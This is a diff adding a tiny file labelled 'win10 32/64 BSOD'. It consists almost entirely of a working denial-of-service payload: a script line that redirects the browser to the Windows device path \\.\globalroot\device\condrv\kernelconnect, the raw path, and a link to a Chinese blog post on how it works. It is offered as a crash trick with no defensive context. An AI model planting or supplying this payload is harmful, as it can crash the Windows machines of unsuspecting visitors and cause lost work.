@@ -1,0 +1,9 @@
+
+win10 32/64 BSOD
+
+<script>document.location = '\\\\.\\globalroot\\device\\condrv\\kernelconnect';</script>
+
+\\.\globalroot\device\condrv\kernelconnect
+
+原理：https://blog.csdn.net/xuandao_ahfengren/article/details/112855004
+
